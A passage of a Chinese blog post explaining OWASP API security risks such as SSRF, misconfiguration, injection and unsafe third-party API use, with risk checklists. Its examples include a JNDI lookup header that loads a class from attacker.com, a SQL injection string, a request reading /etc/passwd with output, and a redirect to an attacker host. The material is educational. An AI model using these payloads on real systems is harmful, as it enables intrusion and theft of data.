+<li>目标机存在程序设计或人为疏忽，导致攻击者能以权限较高的身份执行程序。并不是任何一个权限的帐号都能够被利用的，只有权限达到操作系统一定要求的才<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%81%E8%AE%B8?fromModule=lemma_inlink">允许</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%A7%E8%A1%8C/3012?fromModule=lemma_inlink">执行</a>修改<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B3%A8%E5%86%8C%E8%A1%A8?fromModule=lemma_inlink">注册表</a>，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BF%AE%E6%94%B9?fromModule=lemma_inlink">修改</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/log/1775292?fromModule=lemma_inlink">log</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%AE%B0%E5%BD%95/14312145?fromModule=lemma_inlink">记录</a>等相关<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BF%AE%E6%94%B9?fromModule=lemma_inlink">修改</a>。</li>
+</ul>
+</li>
+</ul>
+<h2 id="服务器端请求伪造"><a href="#服务器端请求伪造" class="headerlink" title="服务器端请求伪造"></a>服务器端请求伪造</h2><p>SSRF漏洞成因：</p>
+<p>（1）服务端提供了从其他服务器应用获取数据的功能；</p>
+<p>（2）服务端对目标地址做过滤与限制 。</p>
+<p>攻击目标：一般情况下 ， SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统）。</p>
+<ul>
+<li><p>端口扫描（扫描内网）</p>
+</li>
+<li><p>攻击Web应用进行指纹识别及其中的漏洞</p>
+<ul>
+<li><strong>工具</strong>（debian&#x2F;ubuntu）：<strong>whatweb</strong>； <strong>wafw00f</strong></li>
+</ul>
+</li>
+<li><p>如果PHP安装了expect扩展，可以通过expect协议执行系统命令</p>
+<ul>
+<li><p>expect:&#x2F;&#x2F; — 处理交互式的流</p>
+<p>该封装协议默认未开启</p>
+<p>为了使用 expect:&#x2F;&#x2F; 封装器，必须安装 » PECL 上的 » Expect 扩展。</p>
+<p>用法</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">expect</span>:<span class="comment">//command</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>dos攻击</p>
+</li>
+<li><p>file 协议暴力枚举敏感文件</p>
+<ul>
+<li><p>文件URI的形式为</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file：<span class="comment">// host / path1</span></span><br></pre></td></tr></table></figure>
+
+<p>host是可以在其上访问路径的系统的标准域名<br>path是格式为directory &#x2F; directory &#x2F;…&#x2F; name的分层目录路径。</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>场景案例</strong>：百度识图功能。</p>
+<p>用户可以从本地或URL的方式获取图片资源，交给百度识图处理。如果提交的是URL地址，该应用就会通过URL寻找图片资源。如果Web应用开放了类似于百度识图这样的功能，并且对用户提供的URL和远端服务器返回的信息没有进行合适的验证或者过滤，就可能存在“请求伪造”的缺陷。</p>
+<h2 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h2><p>在对应用程序、框架、应用程序服务器、web服务器、数据库服务器等执行安全配置时，由于配置不当导致的漏洞。可以不经授权就可以访问某些系统数据或使用系统功能。</p>
+<ul>
+<li><p>使用了有安全缺陷的版本</p>
+<ul>
+<li>如果 API 的支持安全配置揭示了未修补的漏洞，则攻击者有可能利用已发布的漏洞轻松“pwn”API 及其系统。</li>
+</ul>
+</li>
+<li><p>没有修改默认的帐户密码</p>
+<ul>
+<li>攻击者可以使用这些凭据代入该帐户的角色。这可能允许他们访问敏感信息或管理功能。</li>
+</ul>
+</li>
+<li><p>密码、会话ID和其他认证凭据使用未加密连接传输</p>
+<ul>
+<li>任何向使用者提供敏感信息的 API 都应使用传输层安全性 （TLS） 来加密数据。即使 API 仅在内部、私有或合作伙伴级别提供，使用 TLS（加密 HTTPS 流量的协议）也是确保 API 请求和响应在通过网络传递时受到保护的最基本方法之一。配置错误或缺少传输加密可能会导致 API 用户以明文形式跨网络传递敏感的 API 信息。然后攻击者可以使用MITM攻击来利用它。</li>
+</ul>
+</li>
+<li><p>未强制执行HTTPS</p>
+<ul>
+<li>不必要的 HTTP 方法，则应用程序无法正确处理这些方法或导致敏感信息泄露的风险会增加。</li>
+</ul>
+</li>
+<li><p>错误的标头</p>
+<ul>
+<li><p>API 提供程序使用标头为使用者提供处理响应和安全要求的说明。配置错误的标头可能导致敏感信息泄露、降级攻击和跨站点脚本攻击。</p>
+</li>
+<li><p>例如，采用以下响应：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/ 200 OK</span><br><span class="line">--snip--</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>VulnService 1.11 // reveal backend tech =&gt; search exploits</span><br><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>0 // could be changed to 1</span><br><span class="line"><span class="attribute">X-Response-Time</span><span class="punctuation">: </span>566.43</span><br><span class="line">//If the X-Response-Time header has a consistent response time for nonexistent records, for example, but increases </span><br><span class="line">// its response time for certain other records, this could be an indication that those records exist.</span><br><span class="line">HTTP/UserA 404 Not Found</span><br><span class="line">--snip--</span><br><span class="line"><span class="attribute">X-Response-Time</span><span class="punctuation">: </span>25.5</span><br><span class="line">HTTP/UserB 404 Not Found</span><br><span class="line">--snip--</span><br><span class="line"><span class="attribute">X-Response-Time</span><span class="punctuation">: </span>25.5</span><br><span class="line">HTTP/UserC 404 Not Found</span><br><span class="line">--snip--</span><br><span class="line"><span class="attribute">X-Response-Time</span><span class="punctuation">: </span>510.00</span><br></pre></td></tr></table></figure>
+
+<p>在这种情况下，UserC 的响应时间值是其他资源的响应时间的 20 倍。由于样本量如此之小，很难明确地断定 UserC 存在。</p>
+<p>例如，你知道像这样的虚假帐户的平均X响应时间为ms。你还知道，您现有的帐户 &#x2F;user&#x2F;account&#x2F;1021 收到的 X 响应时间。如果您随后发送了请求，强制所有帐号从x到x，您可以查看结果并查看哪些帐号导致响应时间大幅增加。&#x2F;user&#x2F;account&#x2F;thisdefinitelydoesnotexist87625.5510.0010002000</p>
+</li>
+</ul>
+</li>
+<li><p>未净化处理的输入导致数据受损</p>
+<ul>
+<li>缺少输入判断清理，攻击者将恶意负载上传到服务器</li>
+<li>如果使用上传端点将上传的文件传递到 Web 目录，则它可能允许上传脚本。导航到文件所在的 URL 可以启动脚本， 导致对 Web 服务器的直接外壳访问。</li>
+</ul>
+</li>
+<li><p>跨域资源共享</p>
+<ul>
+<li><p>跨源资源共享 (CORS) （或通俗地译为跨域资源共享）是一种基于HTTP 头的机制，该机制通过允许服务器标示除了它自己以外的其它origin（域，协议和端口），这样浏览器可以访问加载这些资源。跨源资源共享还通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的”预检”请求。在预检中，浏览器发送的头中标示有HTTP方法和真实请求中会用到的头。</p>
+</li>
+<li><p>比如说，假如站点 <a target="_blank" rel="noopener" href="http://foo.example/">http://foo.example</a> 的网页应用想要访问 <a target="_blank" rel="noopener" href="http://bar.other/">http://bar.other</a> 的资源。<a target="_blank" rel="noopener" href="http://foo.example/">http://foo.example</a> 的网页中可能包含类似于下面的 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=JavaScript&spm=1001.2101.3001.7020">JavaScript</a> 代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/public-data/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callOtherDomain</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(invocation) &#123;</span><br><span class="line">    invocation.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">    invocation.<span class="property">onreadystatechange</span> = handler;</span><br><span class="line">    invocation.<span class="title function_">send</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<img src="/2023/07/30/api%E5%AE%89%E5%85%A8/06f4468ca69e4c3daf3f58d0428c82c9.png" class="" title="img">
+
+<ul>
+<li><p>敏感资源没有做访问控制</p>
+<ul>
+<li>应用服务器程序附带的示例应用程序在生产环境中没有删除，示例应用程序本身具有安全缺陷，可能被攻击者利用。假设示例应用程序是管理控制台并且默认帐户密码没有更改的情况下，攻击者可以很轻松使用默认帐户密码登录并管理应用服务器程序。</li>
+<li>Web 服务器没有禁用目录遍历，攻击者可以通过遍历目录很容易得获取到服务器上的数据。</li>
+<li>应用程序将详细的错误消息(例如堆栈信息)返回给用户，这可能会暴露敏感信息或潜在安全问题。</li>
+</ul>
+</li>
+<li><p>注入</p>
+<ul>
+<li>当请求传递到 API 的支持基础结构并且 API 提供程序不筛选输入以删除不需要的字符（此过程称为输入清理）时，存在注入缺陷。详细的错误消息、HTTP 响应代码和意外的 API 行为都可能是您可能发现了注入缺陷的线索。</li>
+<li>API 可能会将该有效负载直接传递到后端 SQL 数据库，其中 OR 1&#x3D;0 语句将失败（因为 1 不等于 0），从而导致一些 SQL 错误：</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/register HTTP 1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line">--snip--</span><br><span class="line">&#123;</span><br><span class="line">&quot;Fname&quot;: &quot;hAPI&quot;,</span><br><span class="line">&quot;Lname&quot;: &quot;Hacker&quot;,</span><br><span class="line">&quot;Address&quot;: &quot;&#x27; OR 1=0--&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>注入漏洞通常辅以其他漏洞，例如输入清理不良。在以下示例中，您可以看到一种代码注入攻击，该攻击使用 API GET 请求来利用弱查询参数。在这种情况下，弱查询参数将请求的查询部分中的任何数据直接传递到底层系统，而不先对其进行清理：以下响应正文显示 API 端点已纵为显示主机的 &#x2F;etc&#x2F;passwd 文件，从而显示系统上的用户：</p>
+<p>GET <a target="_blank" rel="noopener" href="http://10.10.78.181:5000/api/v1/resources/books%EF%BC%9Fshow=/etc/passwd">http://10.10.78.181:5000/api/v1/resources/books？show=/etc/passwd</a></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>场景案例：</strong></p>
+<p>API后端服务器使用了一些流行的第三方编写的访问日志来记录用户请求和响应信息。这些记录工具支持占位符扩展和JNDI查找，每个请求都会产生一个新的日志条目，记录下请求的详细信息，例如请求时间、请求类型、请求者IP地址等。这些日志数据可以帮助开发人员进行调试和性能优化，并且也可以用于安全审计和故障排除。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;method&gt; &lt;api_version&gt;/&lt;path&gt; - &lt;status_code&gt;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者发出以下API请求，该请求将写入访问权限日志文件：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /health</span><br><span class="line">X-Api-Version: $&#123;jndi:ldap:<span class="comment">//attacker.com/Malicious.class&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于日志记录实用程序的默认配置不够安全，并且网络出站策略太宽松，攻击者可以将恶意代码写入API请求中，然后通过访问日志记录工具来执行恶意代码。</p>
+<h2 id="库存管理不当"><a href="#库存管理不当" class="headerlink" title="库存管理不当"></a>库存管理不当</h2><ul>
+<li>未下线的老版本&#x2F;临时调试api<ul>
+<li>存量资产管理不当是指企业没有对其现有的IT资源（包括硬件、软件、网络设备等）进行有效管理和监控。这会导致一些旧的或者不再使用的IT资源没有被及时清理，而这些资源可能存在安全漏洞，被黑客利用入侵企业系统。此外，未经管理的存量资产也可能使企业面临更高的运营成本和维护难度。</li>
+<li>当组织公开 API 时，会发生不正确的资产管理 已停用或仍在开发中。仍在开发的 API 通常不如生产 API 对应项安全。</li>
+<li>资产管理不当会导致其他漏洞，例如数据过度暴露、信息泄露、批量分配、速率限制不当和 API 注入等。</li>
+<li>您可以通过密切关注仓库中过时的 API 文档、更改日志和版本历史记录来发现不当的资产管理。</li>
+<li>组织通常在其终结点名称中包含版本控制信息，以区分较旧版本和较新版本，例如 等。仍在开发中的 API 通常使用诸如 .如果知道 API 现在正在使用 apiv3.org&#x2F;admin 但 API 文档的一部分提到了 apiv1.org&#x2F;admin，则可以尝试测试不同的端点以查看 apiv1 或 apiv2 是否仍处于活动状态。此外，组织的更新日志 可能会披露 v1 更新或停用的原因。如果您有权访问 v1，则可以测试这些弱点&#x2F;v1&#x2F;, &#x2F;v2&#x2F;, &#x2F;v3&#x2F;&#x2F;alpha&#x2F;, &#x2F;beta&#x2F;, &#x2F;test&#x2F;, &#x2F;uat&#x2F;, and &#x2F;demo&#x2F;</li>
+<li>在使用文档之外，您还可以通过使用猜测、模糊测试或暴力请求来发现不正确的资产管理漏洞。观察 API 文档或路径命名方案中的模式，然后根据您的假设发出请求。</li>
+</ul>
+</li>
+</ul>
+<p><strong>场景案例：</strong></p>
+<p>社交网络允许独立应用程序的开发人员与之集成，这个过程需要用户同意分享他们的个人信息。然而，社交网络和独立应用程序之间的数据流缺乏监控和限制，这使得独立应用程序可以访问用户信息，甚至是用户朋友的私人信息。</p>
+<p>一家咨询公司建立了一个恶意应用程序，并成功地获取了270,000个用户的授权。由于这个漏洞，咨询公司能够访问50,000,000名用户的私人信息。最终，该咨询公司因为恶意目的出售了这些信息，给用户带来了巨大的隐私风险。</p>
+<h2 id="API不安全使用"><a href="#API不安全使用" class="headerlink" title="API不安全使用"></a>API不安全使用</h2><ul>
+<li>信任第三方api而不检验（供应链角度 ）</li>
+</ul>
+<p><strong>eg：</strong></p>
+<p>API与第三方服务提供商集成了用户的医疗敏感信息。数据使用HTTP通过安全链接发送请求如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /user/store_phr_record</span><br><span class="line">&#123; <span class="string">&quot;genome&quot;</span>: <span class="string">&quot;ACTAGTAG__TTGADDAAIICCTT…&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者找到了一种破坏第三方API的方法，使用308重定向响应与上一个类似的请求。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">308</span> Permanent Redirect</span><br><span class="line">Location: https:<span class="comment">//attacker.com/</span></span><br></pre></td></tr></table></figure>
+
+<p>由于API盲目地遵循第三方重定向，攻击者可以在其中插入恶意代码。这使得API会重复发送用户的请求和敏感数据到攻击者的服务器上，而不是原来的目标服务器上。攻击者可以利用这些数据进行各种恶意行为，例如窃取用户信息、入侵企业网络等。</p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h4 id="合作伙伴风险"><a href="#合作伙伴风险" class="headerlink" title="合作伙伴风险"></a>合作伙伴风险</h4><ul>
+<li><p>合作伙伴违规</p>
+</li>
+<li><p>合作伙伴被攻破</p>
+</li>
+<li><p>合作伙伴离职员工风险</p>
+</li>
+<li><p>业务合规风险</p>
+</li>
+<li><p>采集涉敏数据与报备不一致</p>
+</li>
+<li><p>数据违规开放&amp;共享</p>
+</li>
+<li><p>数据违规出境</p>
+</li>
+<li><p>接口违反最小化原则</p>
+</li>
+</ul>
+<h4 id="内部人员攻击风险"><a href="#内部人员攻击风险" class="headerlink" title="内部人员攻击风险"></a>内部人员攻击风险</h4><ul>
+<li>内部人员、外包员工违规滥用和窃取敏感数据</li>
+<li>离职员工窃取数据风险</li>
+<li>安全访问控制配置错误&amp;失效</li>
+<li>外部人员攻击风险</li>
+</ul>
+<h4 id="BYOD风险"><a href="#BYOD风险" class="headerlink" title="BYOD风险"></a>BYOD风险</h4><ul>
+<li>系统违规暴露到互联网</li>
+<li>业务合规风险</li>
+<li>脱敏保护策略缺乏</li>
+<li>页面呈现数据违反最小化原则</li>
+<li>账号&amp;权限缺乏管控，账号共用</li>
+</ul>
+<h4 id="从防范缺陷角度"><a href="#从防范缺陷角度" class="headerlink" title="从防范缺陷角度"></a>从防范缺陷角度</h4><p>疑似内部接口暴露：内部接口（例如，用于内部办公、开发测试、运营管理的接口）暴露在公网。</p>
+<p>缺乏访问限速机制：接口在应对高频访问时，缺少安全防护机制，可能导致暴力破解、恶意爬虫等。</p>
+<p>敏感数据过度暴露：接口暴露过多的敏感数据，可能导致大规模数据泄漏。</p>
+<p>缺乏异常处理机制：检测到程序报错信息，可能存在SQL注入、泄漏应用配置等风险。</p>
+<p>缺乏访问控制机制：接口对不符合日常基线的访问（例如，异常地区访问）</p>
+<p>缺乏控制机制：敏感数据接口缺乏鉴权机制</p>
+<p>接口缺少鉴权机制：可以被未授权的访问者访问，用于获取敏感数据。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://wenyunw.me">Wenyun Wang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://wenyunw.me/2023/07/30/api%E5%AE%89%E5%85%A8/">http://wenyunw.me/2023/07/30/api%E5%AE%89%E5%85%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/API-Security/">API Security</a></div><div class="post_share"><div class="social-share" data-image="/images/owasp.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/31/wireshark/" title="可抓包wireshark安装Linux"><img class="cover" src="/images/wireshark.jpg" onerror="onerror=null;src='/images/404_pic.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">可抓包wireshark安装Linux</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/27/codeql/" title="CodeQL安装与使用"><img class="cover" src="/images/codeql.png" onerror="onerror=null;src='/images/404_pic.png'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CodeQL安装与使用</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Wenyun Wang</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/willowwy" target="_blank" title="Github"><i class="fab fa-github" style="color: #1e3050;"></i></a><a class="social-icon" href="mailto:wenyunw@andrew.cmu.edu" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #1e3050;"></i></a><a class="social-icon" href="https://www.google.com/maps/place/The+Information+Networking+Institute/@40.4460669,-79.9486752,19z/data=!3m1!4b1!4m6!3m5!1s0x8834f2246db2baff:0x85b7d021fa341b37!8m2!3d40.4460659!4d-79.9480315!16s%2Fm%2F03nrl47?entry=ttu&amp;g_ep=EgoyMDI0MDgyOC4wIKXMDSoASAFQAw%3D%3D" target="_blank" title="Location"><i class="fas fa-location-arrow" style="color: #1e3050;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/wenyunw/" target="_blank" title="Linkedin"><i class="fab fa-linkedin" style="color: #1e3050;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm seeking an full-time now.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E7%BA%A7%E5%88%AB%E6%8E%88%E6%9D%83%E5%A4%B1%E6%95%88%EF%BC%88%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">对象级别授权失效（水平越权）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88"><span class="toc-number">2.</span> <span class="toc-text">身份认证失效</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E7%BA%A7%E5%88%AB%E6%8E%88%E6%9D%83%E5%A4%B1%E6%95%88"><span class="toc-number">3.</span> <span class="toc-text">对象属性级别授权失效</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E5%80%BC"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">随机值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.0.0.2.</span> <span class="toc-text">数据替换</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="toc-number">3.0.0.3.</span> <span class="toc-text">对称加密</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B9%B3%E5%9D%87%E5%80%BC"><span class="toc-number">3.0.0.4.</span> <span class="toc-text">平均值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%81%8F%E7%A7%BB%E5%92%8C%E5%8F%96%E6%95%B4"><span class="toc-number">3.0.0.5.</span> <span class="toc-text">偏移和取整</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E6%B6%88%E8%80%97%E6%97%A0%E9%99%90%E5%88%B6"><span class="toc-number">4.</span> <span class="toc-text">资源消耗无限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%E7%BA%A7%E6%8E%88%E6%9D%83%E5%A4%B1%E6%95%88%EF%BC%88%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">功能级授权失效（垂直越权）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%95%8F%E6%84%9F%E4%B8%9A%E5%8A%A1%E6%B5%81%E6%97%A0%E9%99%90%E5%88%B6"><span class="toc-number">6.</span> <span class="toc-text">访问敏感业务流无限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">7.</span> <span class="toc-text">服务器端请求伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">8.</span> <span class="toc-text">安全配置错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%93%E5%AD%98%E7%AE%A1%E7%90%86%E4%B8%8D%E5%BD%93"><span class="toc-number">9.</span> <span class="toc-text">库存管理不当</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API%E4%B8%8D%E5%AE%89%E5%85%A8%E4%BD%BF%E7%94%A8"><span class="toc-number">10.</span> <span class="toc-text">API不安全使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">11.</span> <span class="toc-text">补充</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%88%E4%BD%9C%E4%BC%99%E4%BC%B4%E9%A3%8E%E9%99%A9"><span class="toc-number">11.0.1.</span> <span class="toc-text">合作伙伴风险</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E9%83%A8%E4%BA%BA%E5%91%98%E6%94%BB%E5%87%BB%E9%A3%8E%E9%99%A9"><span class="toc-number">11.0.2.</span> <span class="toc-text">内部人员攻击风险</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BYOD%E9%A3%8E%E9%99%A9"><span class="toc-number">11.0.3.</span> <span class="toc-text">BYOD风险</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E%E9%98%B2%E8%8C%83%E7%BC%BA%E9%99%B7%E8%A7%92%E5%BA%A6"><span class="toc-number">11.0.4.</span> <span class="toc-text">从防范缺陷角度</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By Wenyun Wang</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
